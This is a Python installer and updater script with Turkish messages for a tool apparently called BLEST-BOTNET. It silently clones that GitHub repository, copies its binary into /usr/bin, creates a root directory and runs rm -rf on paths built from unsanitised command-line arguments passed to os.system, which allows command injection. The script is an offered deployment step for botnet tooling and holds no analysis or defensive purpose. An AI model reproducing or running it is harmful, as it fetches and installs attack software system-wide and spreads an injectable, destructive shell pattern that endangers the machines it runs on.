import os
import time
import sys
try:
    import colorama
except ImportError:
    os.system("pip install colorama &> colorama.log")
try:
    from colorama import Fore
except ImportError:
    print('colorama modülleri içe aktarılamıyor!')

if len(sys.argv) < 3:
    exit()

git = "https://github.com/G00Dway/BLEST-BOTNET"
cmd = sys.argv[1]
type = sys.argv[2]
def install():
    try:
        if os.path.exists("/usr/var/blest_backup/BLEST"):
            os.system("rm -rf /usr/var/blest_backup/BLEST")
        if os.path.exists(cmd):
            os.system(f'mv {cmd} /usr/var/blest_backup')
        else:
            pass
    except:
        pass
    requirements = ['chmod +x core/bin/blest', 'cp -r core/bin/blest /usr/bin', 'mkdir /root/.blest']
    try:
        os.system(f"git clone {git} {cmd} > /dev/null 2>&1")
    except:
        sys.exit()
    try:
        if os.path.exists(cmd):
            pass
        else:
            print(Fore.RED+'[-]'+Fore.RESET+' Hata: BLEST yüklenemedi! internet açık?')
            sys.exit()
    except:
        pass
    for i in requirements:
        try:
            os.system(i+' > /dev/null 2>&1')
        except:
            pass


def update():
    commands = [f'rm -rf {cmd}', f'git clone {git} {cmd}', 'rm -rf /usr/bin/blest', f'chmod +x {cmd}/core/bin/blest', f'cp -r {cmd}/core/bin/blest /usr/bin']
    for i in commands:
        if 'git clone' in i:
            try:
                os.system(i+' > /dev/null 2>&1')
                if os.path.exists(cmd):
                    pass
                else:
                    print(Fore.RED+'[-]'+Fore.RESET+' Database kurulumu başarısız oldu! internet açık?')
                    sys.exit()
            except:
                pass
        try:
            os.system(i+' > /dev/null 2>&1')
        except:
            pass


if cmd == ' ' or cmd == '':
    sys.exit()
else:
    pass

if 'install' in type:
    install()
elif 'update' in type:
    update()
elif 'install-update' in type:
    install()
    update()
else:
    print(Fore.RED+'[-]'+Fore.RESET+' Bilinmeyen emr!')

sys.exit()
